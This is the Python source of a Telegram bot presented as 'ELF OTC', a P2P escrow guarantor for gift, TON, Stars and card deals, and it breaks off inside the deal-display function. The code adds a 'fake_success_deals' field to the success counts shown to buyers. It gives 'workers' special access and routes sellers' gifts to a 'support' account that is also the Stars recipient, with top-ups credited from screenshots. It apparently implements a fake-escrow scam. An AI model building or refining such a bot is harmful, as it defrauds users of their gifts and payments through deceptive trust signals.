import asyncio
import secrets
from decimal import Decimal, InvalidOperation
from pathlib import Path

from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton,
    FSInputFile, LinkPreviewOptions,
)
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from sqlalchemy import select, update, func

from db import init_db, SessionLocal
from models import User, Deal, LedgerEntry, TopUpRequest

# ============================================================
#  НАСТРОЙКИ — впиши сюда. .env не нужен.
# ============================================================
TOKEN = "PASTE_BOT_TOKEN_HERE"          # токен от @BotFather
ADMIN_IDS = {195391265}                 # твой Telegram ID (число из @userinfobot)
# Юзернеймы воркеров (без @) — им тоже доступен /cliro
WORKER_USERNAMES = {"cliro"}
# ============================================================

TON_DEPOSIT_ADDRESS = "UQD9qii_hUBsLpDi1HRj3oMTcZmwoVRbMBhcMi_DZVJJcykT"
STARS_USERNAME = "@cliro"
INSTRUCTIONS_URL = "https://t.me/OTC_instructions"
BANNER_PATH = Path(__file__).parent / "banner.jpg"


def is_worker(user) -> bool:
    """Доступ к /cliro: ADMIN_IDS или username из WORKER_USERNAMES."""
    if user is None:
        return False
    if user.id in ADMIN_IDS:
        return True
    uname = (user.username or "").lower()
    return uname in {x.lower() for x in WORKER_USERNAMES}

if not TOKEN or TOKEN == "PASTE_BOT_TOKEN_HERE":
    raise RuntimeError("Открой bot.py и впиши TOKEN в начале файла.")

bot = Bot(TOKEN, default=DefaultBotProperties(parse_mode=ParseMode.HTML))
dp = Dispatcher()

# Custom emoji IDs
E_WALLET = "5444960062407732826"
E_USER = "5373012449597335010"
E_PIN = "5447187153274567373"
E_BANK = "5264895611517300926"
E_MONEY = "5375296873982604963"
E_NOTE = "5334882760735598374"
E_WARN = "5447381715293074599"
E_CREATE = "5334882760735598374"
E_WALLET_BTN = "5379600444098093058"
E_BALANCE = "5431577498364158238"
E_REF = "5357080225463149588"
E_LANG = "5445326466067754897"
E_SUPPORT = "5467539229468793355"
E_TON = "5471952986970267163"
E_CARD = "5447453226498552490"
E_STARS = "5463289097336405244"
E_RUB = "5350708147558297488"       # 💰 рубли
E_GIFT = "5203996991054432397"      # 🎁 подарок
E_HOME = "5465226866321268133"
E_BRIEFCASE = "5359785904535774578"
E_BOOK = "5226512880362332956"
E_DOT = "5204202247541497753"


def ce(eid: str, fb: str) -> str:
    return f'<tg-emoji emoji-id="{eid}">{fb}</tg-emoji>'


def fmt_amount(v) -> str:
    """500.0000 -> 500, 1.5000 -> 1.5"""
    d = Decimal(str(v)).normalize()
    s = format(d, 'f')
    if '.' in s:
        s = s.rstrip('0').rstrip('.')
    return s or '0'


def cur_emoji(currency: str) -> str:
    c = (currency or '').upper()
    if c in ('STARS', 'STAR'):
        return ce(E_STARS, '⭐')
    if c == 'TON':
        return ce(E_TON, '💎')
    return ce(E_RUB, '💰')


# Статусы сделки + кастомные эмодзи
STATUS_EMOJI = {
    "open": E_NOTE,              # 📝 ждёт покупателя
    "escrow": E_MONEY,           # 💰 средства в резерве
    "waiting_support": E_SUPPORT,  # 📞 на проверке у саппорта
    "completed": E_GIFT,         # 🎁 завершена
    "dispute": E_WARN,           # ⚠️ спор
}
STATUS_FALLBACK = {
    "open": "📝",
    "escrow": "💰",
    "waiting_support": "📞",
    "completed": "✅",
    "dispute": "⚠️",
}
STATUS_LABEL = {
    "open": {"ru": "Ожидает покупателя", "en": "Waiting for buyer"},
    "escrow": {"ru": "Оплата получена · передайте подарок", "en": "Paid · transfer the gift"},
    "waiting_support": {"ru": "На проверке у саппорта", "en": "Under support review"},
    "completed": {"ru": "Завершена", "en": "Completed"},
    "dispute": {"ru": "Спор", "en": "Dispute"},
}


def deal_status_line(status: str, lang: str = "ru") -> str:
    st = status or "open"
    eid = STATUS_EMOJI.get(st, E_NOTE)
    fb = STATUS_FALLBACK.get(st, "•")
    label = STATUS_LABEL.get(st, {}).get(lang) or STATUS_LABEL.get(st, {}).get("ru") or st
    return f"{ce(eid, fb)} <b>Статус:</b> {label}" if lang != "en" else f"{ce(eid, fb)} <b>Status:</b> {label}"


class DealForm(StatesGroup):
    method = State()
    requisites = State()
    amount = State()
    description = State()
    gift_link = State()


class TopUpForm(StatesGroup):
    method = State()
    amount = State()
    proof = State()


class WalletForm(StatesGroup):
    ton = State()
    card = State()


class SupportForm(StatesGroup):
    message = State()


def home_btn(lang: str = "ru") -> InlineKeyboardButton:
    text = "Home" if lang == "en" else "В главное меню"
    return InlineKeyboardButton(
        text=text,
        callback_data="main_menu",
        icon_custom_emoji_id=E_HOME,
    )


def main_kb(lang: str = "ru") -> InlineKeyboardMarkup:
    if lang == "en":
        labels = {
            "create": "Create deal",
            "wallet": "Add/edit wallet",
            "balance": "Balance",
            "referral": "Referral",
            "language": "Language",
            "support": "Support",
        }
    else:
        labels = {
            "create": "Создать сделку",
            "wallet": "Добавить/изменить кошелёк",
            "balance": "Баланс",
            "referral": "Рефералка",
            "language": "Язык",
            "support": "Тех-Поддержка",
        }
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=labels["create"], callback_data="create_deal", icon_custom_emoji_id=E_CREATE)],
        [InlineKeyboardButton(text=labels["wallet"], callback_data="wallet", icon_custom_emoji_id=E_WALLET_BTN)],
        [InlineKeyboardButton(text=labels["balance"], callback_data="balance", icon_custom_emoji_id=E_BALANCE)],
        [InlineKeyboardButton(text=labels["referral"], callback_data="referral", icon_custom_emoji_id=E_REF)],
        [InlineKeyboardButton(text=labels["language"], callback_data="language", icon_custom_emoji_id=E_LANG)],
        [InlineKeyboardButton(text=labels["support"], callback_data="support", icon_custom_emoji_id=E_SUPPORT)],
    ])


def start_caption(lang: str = "ru") -> str:
    if lang == "en":
        return (
            "<b>Welcome to ELF OTC – your reliable P2P guarantor</b>\n\n"
            f"{ce(E_BRIEFCASE, '💼')} <b>Buy and sell anything – safely!</b>\n"
            "From Telegram gifts and NFTs to tokens and fiat – "
            "transactions are easy and risk-free.\n\n"
            f"{ce(E_DOT, '🔹️')} Convenient wallet management\n"
            f"{ce(E_DOT, '🔹️')} Referral system\n\n"
            f"{ce(E_BOOK, '📖')} <b>How to use?</b>\n"
            f"<a href=\"{INSTRUCTIONS_URL}\">INSTRUCTION</a>\n\n"
            "Choose a section below:"
        )
    return (
        "<b>Добро пожаловать в ELF OTC – надёжный P2P-гарант</b>\n\n"
        f"{ce(E_BRIEFCASE, '💼')} <b>Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
        "От Telegram-подарков и NFT до токенов и фиата – "
        "сделки проходят легко и без риска.\n\n"
        f"{ce(E_DOT, '🔹️')} Удобное управление кошельками\n"
        f"{ce(E_DOT, '🔹️')} Реферальная система\n\n"
        f"{ce(E_BOOK, '📖')} <b>Как пользоваться?</b>\n"
        f"Ознакомьтесь с <a href=\"{INSTRUCTIONS_URL}\">ИНСТРУКЦИЕЙ</a>\n\n"
        "Выберите нужный раздел ниже:"
    )


async def ensure_user(session, tg_user) -> User:
    user = await session.scalar(select(User).where(User.telegram_id == tg_user.id))
    if user is None:
        user = User(telegram_id=tg_user.id, username=tg_user.username or "")
        session.add(user)
        await session.flush()
    else:
        user.username = tg_user.username or user.username
    return user


async def get_lang(tg_user) -> str:
    async with SessionLocal() as session:
        user = await ensure_user(session, tg_user)
        await session.commit()
        return user.language or "ru"


# ---------- i18n ----------
T = {
    "home": {"ru": "В главное меню", "en": "Home"},
    "choose_pay_method": {
        "ru": "{e} <b>Выберите метод получения оплаты:</b>",
        "en": "{e} <b>Choose payment method:</b>",
    },
    "ton": {"ru": "TON", "en": "TON"},
    "card": {"ru": "Карта РФ", "en": "RF Card"},
    "stars": {"ru": "Звезды", "en": "Stars"},
    "enter_amount_ton": {
        "ru": "<b>Введите сумму сделки в TON:</b>\n\nПример: <code>1.5</code>",
        "en": "<b>Enter deal amount in TON:</b>\n\nExample: <code>1.5</code>",
    },
    "enter_amount_stars": {
        "ru": "<b>Введите сумму сделки в Stars:</b>\n\nПример: <code>100</code>",
        "en": "<b>Enter deal amount in Stars:</b>\n\nExample: <code>100</code>",
    },
    "enter_amount_rub": {
        "ru": "<b>Введите сумму сделки в RUB:</b>\n\nПример: <code>500</code>",
        "en": "<b>Enter deal amount in RUB:</b>\n\nExample: <code>500</code>",
    },
    "enter_gift_name": {
        "ru": "Введите название подарка:",
        "en": "Enter gift name:",
    },
    "enter_gift_link": {
        "ru": "<b>Отправьте ссылку на подарок</b>:\n\nЕсли ссылки нет — напишите <code>-</code>",
        "en": "<b>Send gift link</b>:\n\nIf none — type <code>-</code>",
    },
    "need_ton": {
        "ru": "Сначала укажи <b>TON-адрес</b> для получения оплаты.\n\nВведи адрес кошелька:",
        "en": "First enter your <b>TON address</b> to receive payment.\n\nSend wallet address:",
    },
    "need_card": {
        "ru": "Сначала укажи <b>номер телефона / карты (СБП)</b> для получения оплаты.\n\nВведи номер (например +79001234567):",
        "en": "First enter your <b>phone / SBP card</b> to receive payment.\n\nSend number (e.g. +79001234567):",
    },
    "deal_created": {
        "ru": "{note} <b>Сделка создана!</b>\n<code>#{code}</code>\n\n{money} Сумма: <b>{amount} {currency}</b>\n{gift_e} Подарок: <b>{desc}</b>{extra}\n\n{user} Ссылка для покупателя:\n{link}",
        "en": "{note} <b>Deal created!</b>\n<code>#{code}</code>\n\n{money} Amount: <b>{amount} {currency}</b>\n{gift_e} Gift: <b>{desc}</b>{extra}\n\n{user} Buyer link:\n{link}",
    },
    "balance": {
        "ru": "{e} <b>Ваш баланс:</b>\nTON: {ton}\nРубли: {rub}\nStars: {stars}",
        "en": "{e} <b>Your balance:</b>\nTON: {ton}\nRUB: {rub}\nStars: {stars}",
    },
    "topup_btn": {"ru": "Пополнить баланс", "en": "Top up"},
    "withdraw_btn": {"ru": "Вывести", "en": "Withdraw"},
    "choose_topup": {
        "ru": "Выберите валюту пополнения:",
        "en": "Choose top-up currency:",
    },
    "referral": {
        "ru": "{e} <b>Реферальная программа</b>\n\nВаша ссылка:\n{link}\n\nПриглашайте друзей и получайте бонусы.",
        "en": "{e} <b>Referral program</b>\n\nYour link:\n{link}\n\nInvite friends and get bonuses.",
    },
    "support": {
        "ru": "Напишите сообщение в поддержку — мы ответим.",
        "en": "Write a message to support — we will reply.",
    },
    "choose_lang": {
        "ru": "<b>Выберите язык:</b>",
        "en": "<b>Choose language:</b>",
    },
    "wallet_menu": {
        "ru": "{e} <b>Ваши реквизиты</b>\n\nTON: <code>{ton}</code>\nСБП/карта: <code>{card}</code>",
        "en": "{e} <b>Your payment details</b>\n\nTON: <code>{ton}</code>\nSBP/card: <code>{card}</code>",
    },
    "buyer_info": {
        "ru": "{wallet} <b>Информация о сделке</b>\n<code>#{code}</code>\n{status}\n\n{user} Вы покупатель в сделке.\n{pin} Продавец: {seller}\n• Успешные сделки: {done}\n• Вы покупаете подарок: {desc}\n{gift_line}{bank} {pay_label}:\n<code>{pay_to}</code>\n{money} Сумма к оплате: <b>{amount} {currency}</b>\n{note} Комментарий (memo): <code>{memo}</code>\n\n{warn} Убедитесь в правильности данных перед оплатой. Комментарий (memo) обязателен!\nПосле оплаты ожидайте подтверждения. Также можно нажать «Проверить оплату».",
        "en": "{wallet} <b>Deal info</b>\n<code>#{code}</code>\n{status}\n\n{user} You are the buyer.\n{pin} Seller: {seller}\n• Successful deals: {done}\n• You buy gift: {desc}\n{gift_line}{bank} {pay_label}:\n<code>{pay_to}</code>\n{money} Amount: <b>{amount} {currency}</b>\n{note} Payment comment (memo): <code>{memo}</code>\n\n{warn} Check the details before paying. Memo is required!\nAfter payment wait for confirmation. You can also tap «Check payment».",
    },
    "check_pay": {"ru": "Проверить оплату", "en": "Check payment"},
    "pay_balance": {"ru": "Оплатить с баланса", "en": "Pay from balance"},
    "funds_reserved": {
        "ru": "{e} <b>Средства зарезервированы.</b>\n{status}\n\nСумма <b>{amount} {currency}</b> заморожена до передачи подарка.\nПродавец получил инструкцию передать подарок «{desc}» на {support}.\nОжидайте завершения сделки.",
        "en": "{e} <b>Funds reserved.</b>\n{status}\n\nAmount <b>{amount} {currency}</b> is held until gift transfer.\nSeller was instructed to send gift «{desc}» to {support}.\nWait for deal completion.",
    },
    "seller_paid": {
        "ru": "{gift} <b>Оплата по сделке #{code} получена!</b>\n\nПередайте, пожалуйста, подарок:\n<b>{desc}</b>{gift_line}\n\n{cur} Сумма: <b>{amount} {currency}</b> (зарезервирована)\n\n{user} Получатель (саппорт): {support}\n\n1) Нажмите «Передать подарок» — откроется чат с саппортом.\n2) После передачи нажмите «Подтвердить передачу» — средства зачислятся на ваш баланс.",
        "en": "{gift} <b>Payment for deal #{code} received!</b>\n\nPlease transfer the gift:\n<b>{desc}</b>{gift_line}\n\n{cur} Amount: <b>{amount} {currency}</b> (reserved)\n\n{user} Recipient (support): {support}\n\n1) Tap «Transfer gift» — opens chat with support.\n2) After transfer tap «Confirm transfer» — funds will be credited.",
    },
    "transfer_gift": {"ru": "Передать подарок", "en": "Transfer gift"},
    "confirm_transfer": {"ru": "Подтвердить передачу", "en": "Confirm transfer"},
    "i_transferred": {"ru": "Я передал подарок", "en": "I transferred the gift"},
    "waiting_support": {
        "ru": "{status}\n\n✅ Вы отметили передачу. Ожидайте проверки саппортом {support}.\nСредства будут зачислены после подтверждения.",
        "en": "{status}\n\n✅ You marked the transfer. Waiting for support {support} to verify.\nFunds will be credited after confirmation.",
    },
    "admin_confirm_gift": {"ru": "✅ Подарок получен — зачислить", "en": "✅ Gift received — credit funds"},
    "seller_marked": {
        "ru": "{bell} <b>Продавец отметил передачу</b>\nСделка <code>#{code}</code>\n\n{gift} Подарок: <b>{desc}</b>{gift_line}\n{money} Сумма: <b>{amount} {currency}</b>\n{user} Получатель: {support}\n\n{warn} Проверьте подарок и нажмите кнопку ниже.",
        "en": "{bell} <b>Seller marked gift transfer</b>\nDeal <code>#{code}</code>\n\n{gift} Gift: <b>{desc}</b>{gift_line}\n{money} Amount: <b>{amount} {currency}</b>\n{user} Recipient: {support}\n\n{warn} Verify the gift and press the button below.",
    },
    "admin_credit_btn": {"ru": "Подарок получен — зачислить", "en": "Gift received — credit"},
    "funds_credited": {
        "ru": "{status}\n\n✅ <b>Передача подтверждена саппортом.</b>\n\nСредства <b>{amount} {currency}</b> зачислены вам на баланс.\nСделка #{code} завершена.",
        "en": "{status}\n\n✅ <b>Transfer confirmed by support.</b>\n\nFunds <b>{amount} {currency}</b> credited to your balance.\nDeal #{code} completed.",
    },
    "new_buyer": {
        "ru": "🔔 <b>Новый покупатель для сделки #{code}!</b>\nПокупатель: {buyer}\n({n} успешных сделок)",
        "en": "🔔 <b>New buyer for deal #{code}!</b>\nBuyer: {buyer}\n({n} successful deals)",
    },
}


def tr(lang: str, key: str, **kw) -> str:
    block = T.get(key, {})
    s = block.get(lang) or block.get("ru") or key
    if kw:
        try:
            return s.format(**kw)
        except Exception:
            return s
    return s




async def send_start(target, lang: str = "ru"):
    """Отправить стартовый экран с баннером."""
    caption = start_caption(lang)
    kb = main_kb(lang)
    if BANNER_PATH.exists():
        photo = FSInputFile(BANNER_PATH)
        if isinstance(target, Message):
            await target.answer_photo(photo, caption=caption, reply_markup=kb)
        else:
            # CallbackQuery — новое сообщение
            await target.message.answer_photo(photo, caption=caption, reply_markup=kb)
    else:
        if isinstance(target, Message):
            await target.answer(caption, reply_markup=kb, link_preview_options=LinkPreviewOptions(is_disabled=True))
        else:
            await target.message.answer(caption, reply_markup=kb, link_preview_options=LinkPreviewOptions(is_disabled=True))


async def new_deal_code(session) -> str:
    alphabet = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
    for _ in range(30):
        code = "".join(secrets.choice(alphabet) for _ in range(8))
        exists = await session.scalar(select(Deal.id).where(Deal.deal_code == code))
        if exists is None:
            return code
    raise RuntimeError("deal code alloc failed")


# ---------- /start ----------
@dp.message(Command("start"))
async def cmd_start(message: Message, command: CommandObject, state: FSMContext):
    await state.clear()
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        await session.commit()
        lang = user.language or "ru"

    if command.args and command.args.startswith("deal_"):
        try:
            deal_id = int(command.args.split("_", 1)[1])
            await show_deal(message, deal_id)
            return
        except (ValueError, IndexError):
            pass

    await send_start(message, lang)


@dp.callback_query(F.data == "main_menu")
async def cb_main_menu(call: CallbackQuery, state: FSMContext):
    await state.clear()
    lang = await get_lang(call.from_user)
    await call.answer()
    # удаляем старое сообщение если возможно и шлём новое со стартом
    try:
        await call.message.delete()
    except Exception:
        pass
    await send_start(call, lang)


# ---------- Баланс ----------
@dp.callback_query(F.data == "balance")
async def cb_balance(call: CallbackQuery):
    lang = await get_lang(call.from_user)
    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        text = tr(
            lang, "balance",
            e=ce(E_MONEY, "💰"),
            ton=fmt_amount(user.balance_ton),
            rub=fmt_amount(user.balance_rub),
            stars=fmt_amount(user.balance_stars),
        )
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text=tr(lang, "topup_btn"), callback_data="topup", icon_custom_emoji_id=E_MONEY)],
            [home_btn(lang)],
        ])
        try:
            await call.message.edit_text(text, reply_markup=kb)
        except Exception:
            await call.message.answer(text, reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data == "topup")
async def cb_topup(call: CallbackQuery, state: FSMContext):
    await state.clear()
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="TON", callback_data="topup_method:ton", icon_custom_emoji_id=E_TON)],
        [InlineKeyboardButton(text="Звезды", callback_data="topup_method:stars", icon_custom_emoji_id=E_STARS)],
        [home_btn()],
    ])
    await call.message.edit_text(
        "<b>Выберите валюту для пополнения:</b>",
        reply_markup=kb,
    )
    await call.answer()


@dp.callback_query(F.data.startswith("topup_method:"))
async def cb_topup_method(call: CallbackQuery, state: FSMContext):
    method = call.data.split(":")[1]
    if method not in ("ton", "stars"):
        await call.answer("Недоступно", show_alert=True)
        return
    await state.set_state(TopUpForm.amount)
    await state.update_data(method=method)
    if method == "ton":
        text = (
            "<b>Введите сумму пополнения в TON:</b>\n\n"
            f"Адрес для пополнения:\n<code>{TON_DEPOSIT_ADDRESS}</code>"
        )
    else:
        text = (
            "<b>Введите сумму пополнения в Stars:</b>\n\n"
            f"Отправьте Telegram Stars на аккаунт:\n<b>{STARS_USERNAME}</b>"
        )
    await call.message.edit_text(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    await call.answer()


@dp.message(TopUpForm.amount)
async def topup_amount(message: Message, state: FSMContext):
    try:
        amount = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.0001"))
        if amount <= 0:
            raise InvalidOperation
    except Exception:
        lang = await get_lang(message.from_user)
        await message.answer(
            "Enter a valid amount, e.g. 1.5" if lang == "en" else "Введите корректную сумму, например 1.5",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
        return
    await state.update_data(amount=str(amount))
    await state.set_state(TopUpForm.proof)
    await message.answer(
        "📷 <b>Пожалуйста, отправьте скриншот перевода.</b>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )


@dp.message(TopUpForm.proof, F.photo)
async def topup_photo(message: Message, state: FSMContext):
    data = await state.get_data()
    method = data.get("method", "ton")
    amount = Decimal(data.get("amount", "0"))
    photo = message.photo[-1]
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        req = TopUpRequest(
            user_id=user.id, amount=amount, method=method,
            note=f"photo:{photo.file_id}",
        )
        session.add(req)
        await session.commit()
        await session.refresh(req)
        req_id = req.id
    await state.clear()
    label = "TON" if method == "ton" else "Stars"
    await message.answer(
        f"✅ Запрос №{req_id} создан.\nСумма: <b>{amount} {label}</b>\n"
        "Ожидайте проверки администратором.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )
    for admin_id in ADMIN_IDS:
        try:
            await bot.send_photo(
                admin_id,
                photo=photo.file_id,
                caption=(
                    f"📥 Пополнение №{req_id}\n"
                    f"User: @{message.from_user.username or '—'} ({message.from_user.id})\n"
                    f"Метод: {label}\nСумма: {amount}\n"
                    f"/approve_topup {req_id}"
                ),
            )
        except Exception:
            pass


@dp.message(TopUpForm.proof)
async def topup_need_photo(message: Message):
    await message.answer(
        "📷 Нужен скриншот (фото) перевода.",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )


@dp.message(Command("approve_topup"))
async def approve_topup(message: Message, command: CommandObject):
    if message.from_user.id not in ADMIN_IDS:
        await message.answer("Недостаточно прав.")
        return
    try:
        req_id = int(command.args or "")
    except ValueError:
        await message.answer("Использование: /approve_topup ID")
        return
    async with SessionLocal() as session:
        async with session.begin():
            req = await session.get(TopUpRequest, req_id)
            if not req or req.status != "pending":
                await message.answer("Запрос не найден или уже обработан.")
                return
            user = await session.get(User, req.user_id)
            if req.method == "stars":
                user.balance_stars += req.amount
                cur = "Stars"
            else:
                user.balance_ton += req.amount
                cur = "TON"
            req.status = "approved"
            session.add(LedgerEntry(
                user_id=user.id, amount=req.amount, currency=cur, kind="verified_topup"
            ))
            tg_id = user.telegram_id
            amt = req.amount
        await session.commit()
    await message.answer(f"Пополнение №{req_id} подтверждено ({amt} {cur}).")
    try:
        await bot.send_message(tg_id, f"✅ Пополнение <b>{amt} {cur}</b> зачислено.")
    except Exception:
        pass


# ---------- Создать сделку ----------
@dp.callback_query(F.data == "create_deal")
async def cb_create_deal(call: CallbackQuery, state: FSMContext):
    await state.clear()
    lang = await get_lang(call.from_user)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=tr(lang, "ton"), callback_data="deal_method:ton", icon_custom_emoji_id=E_TON)],
        [InlineKeyboardButton(text=tr(lang, "card"), callback_data="deal_method:card", icon_custom_emoji_id=E_CARD)],
        [InlineKeyboardButton(text=tr(lang, "stars"), callback_data="deal_method:stars", icon_custom_emoji_id=E_STARS)],
        [home_btn(lang)],
    ])
    text = tr(lang, "choose_pay_method", e=ce(E_MONEY, "💰"))
    try:
        await call.message.edit_text(text, reply_markup=kb)
    except Exception:
        await call.message.answer(text, reply_markup=kb)
    await call.answer()


@dp.callback_query(F.data.startswith("deal_method:"))
async def cb_deal_method(call: CallbackQuery, state: FSMContext):
    method = call.data.split(":")[1]
    if method not in ("ton", "card", "stars"):
        await call.answer()
        return
    await state.update_data(method=method)
    lang = await get_lang(call.from_user)

    async with SessionLocal() as session:
        user = await ensure_user(session, call.from_user)
        await session.commit()
        ton_w = (user.ton_wallet or "").strip()
        card_w = (user.card_sbp or "").strip()

    if method == "ton" and not ton_w:
        await state.set_state(DealForm.requisites)
        await call.message.edit_text(
            tr(lang, "need_ton"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
        await call.answer()
        return
    if method == "card" and not card_w:
        await state.set_state(DealForm.requisites)
        await call.message.edit_text(
            tr(lang, "need_card"),
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
        await call.answer()
        return

    await state.set_state(DealForm.amount)
    if method == "ton":
        prompt = tr(lang, "enter_amount_ton")
    elif method == "stars":
        prompt = tr(lang, "enter_amount_stars")
    else:
        prompt = tr(lang, "enter_amount_rub")
    await call.message.edit_text(
        prompt,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
    )
    await call.answer()


@dp.message(DealForm.requisites)
async def deal_save_requisites(message: Message, state: FSMContext):
    data = await state.get_data()
    method = data.get("method", "ton")
    value = (message.text or "").strip()
    if len(value) < 5:
        await message.answer(
            "Слишком коротко. Введи нормальный номер или адрес.",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
        )
        return
    async with SessionLocal() as session:
        user = await ensure_user(session, message.from_user)
        if method == "ton":
            user.ton_wallet = value[:128]
        else:
            user.card_sbp = value[:128]
        await session.commit()

    await state.set_state(DealForm.amount)
    if method == "ton":
        prompt = (
            "✅ TON-адрес сохранён.\n\n"
            "<b>Введите сумму сделки в TON:</b>\n\nПример: <code>1.5</code>"
        )
    else:
        prompt = (
            "✅ Реквизиты сохранены.\n\n"
            "<b>Введите сумму сделки в RUB:</b>\n\nПример: <code>500</code>"
        )
    await message.answer(
        prompt,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn()]]),
    )


@dp.message(DealForm.amount)
async def deal_amount(message: Message, state: FSMContext):
    try:
        amount = Decimal(message.text.replace(",", ".")).quantize(Decimal("0.0001"))
        if amount <= 0:
            raise InvalidOperation
    except Exception:
        lang = await get_lang(message.from_user)
        await message.answer(
            "Enter a valid amount, e.g. 1.5" if lang == "en" else "Введите корректную сумму, например 1.5",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        )
        return
    await state.update_data(amount=str(amount))
    lang = await get_lang(message.from_user)
    await state.set_state(DealForm.description)
    await message.answer(
        tr(lang, "enter_gift_name"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
    )


@dp.message(DealForm.description)
async def deal_description(message: Message, state: FSMContext):
    lang = await get_lang(message.from_user)
    name = (message.text or "").strip()[:500]
    if not name:
        await message.answer(tr(lang, "enter_gift_name"))
        return
    await state.update_data(description=name)
    await state.set_state(DealForm.gift_link)
    await message.answer(
        tr(lang, "enter_gift_link"),
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
    )


@dp.message(DealForm.gift_link)
async def deal_gift_link(message: Message, state: FSMContext):
    lang = await get_lang(message.from_user)
    data = await state.get_data()
    method = data.get("method", "ton")
    amount = Decimal(data["amount"])
    description = data.get("description", "")
    link_raw = (message.text or "").strip()
    gift_link = "" if link_raw in ("-", "—", "нет", "Нет", "no", "No", "none") else link_raw[:512]
    currency_map = {"ton": "TON", "card": "RUB", "stars": "Stars"}
    currency = currency_map.get(method, "TON")
    async with SessionLocal() as session:
        seller = await ensure_user(session, message.from_user)
        deal = Deal(
            seller_id=seller.id,
            amount=amount,
            currency=currency,
            pay_method=method,
            description=description,
            gift_link=gift_link,
            deal_code=await new_deal_code(session),
            status="open",
        )
        session.add(deal)
        await session.commit()
        await session.refresh(deal)
        me = await bot.get_me()
        link = f"https://t.me/{me.username}?start=deal_{deal.id}"
        code = deal.deal_code
    await state.clear()
    if gift_link:
        extra = ("\n" + ce(E_PIN, "📍") + (" Link: " if lang == "en" else " Ссылка: ") + gift_link)
    else:
        extra = ""
    if lang == "en":
        text = (
            f"{ce(E_NOTE, '📝')} <b>Deal created!</b>\n{deal_status_line('open', 'en')}\n"
            f"<code>#{code}</code>\n\n"
            f"{cur_emoji(currency)} Amount: <b>{fmt_amount(amount)} {currency}</b>\n"
            f"{ce(E_BRIEFCASE, '💼')} Gift: <b>{description}</b>{extra}\n\n"
            f"{ce(E_USER, '👤')} Buyer link:\n{link}"
        )
    else:
        text = (
            f"{ce(E_NOTE, '📝')} <b>Сделка создана!</b>\n{deal_status_line('open', 'ru')}\n"
            f"<code>#{code}</code>\n\n"
            f"{cur_emoji(currency)} Сумма: <b>{fmt_amount(amount)} {currency}</b>\n"
            f"{ce(E_BRIEFCASE, '💼')} Подарок: <b>{description}</b>{extra}\n\n"
            f"{ce(E_USER, '👤')} Ссылка для покупателя:\n{link}"
        )
    await message.answer(
        text,
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[home_btn(lang)]]),
        disable_web_page_preview=True,
    )


async def show_deal(message: Message, deal_id: int):
    lang = await get_lang(message.from_user)
    async with SessionLocal() as session:
        deal = await session.get(Deal, deal_id)
        if not deal or deal.status != "open":
            await message.answer("Deal not found." if lang == "en" else "Сделка не найдена или уже недоступна.")
            return
        seller = await session.get(User, deal.seller_id)
        seller_name = f"@{seller.username}" if seller and seller.username else "—"
        real_completed = await session.scalar(
            select(func.count()).select_from(Deal).where(
                Deal.seller_id == deal.seller_id, Deal.status == "completed"
            )
        ) or 0
        completed = real_completed + ((seller.fake_success_deals or 0) if seller else 0)

        if deal.pay_method == "ton":
            pay_to = seller.ton_wallet if seller and seller.ton_wallet else TON_DEPOSIT_ADDRESS
            pay_label = "TON address" if lang == "en" else "Адрес для оплаты (TON)"
        elif deal.pay_method == "stars":
            pay_to = STARS_USERNAME
            pay_label = "Stars account" if lang == "en" else "Stars на аккаунт"
        else:
            pay_to = seller.card_sbp if seller and seller.card_sbp else ("ask seller" if lang == "en" else "уточните у продавца")
            pay_label = "SBP / card" if lang == "en" else "Реквизиты (СБП / карта)"

        buyer = message.from_user
        buyer_name = f"@{buyer.username}" if buyer.username else buyer.full_name
        buyer_user = await ensure_user(session, buyer)
        await session.commit()
        b_real = await session.scalar(
            select(func.count()).select_from(Deal).where(
                Deal.seller_id == buyer_user.id, Deal.status == "completed"
            )
        ) or 0
        b_completed = b_real + (buyer_user.fake_success_deals or 0)

        gift_line = ""
        if getattr(deal, "gift_link", None):
            gift_line = ("• Gift link: " if lang == "en" else "• Ссылка на подарок: ") + f"{deal.gift_link}\n"

        text = tr(
            lang, "buyer_info",
            wallet=ce(E_WALLET, "👛"),
            code=deal.deal_code,
            status=deal_status_line(deal.status, lang),
            user=ce(E_USER, "👤"),
            pin=ce(E_PIN, "📍"),
            seller=seller_name,
            done=completed,
            desc=deal.description,
            gift_line=gift_line,
            bank=ce(E_BANK, "🏦"),
            pay_label=pay_label,
            pay_to=pay_to,
            money=cur_emoji(deal.currency),
            amount=fmt_amount(deal.amount),
            currency=deal.currency,
            note=ce(E_NOTE, "📝"),
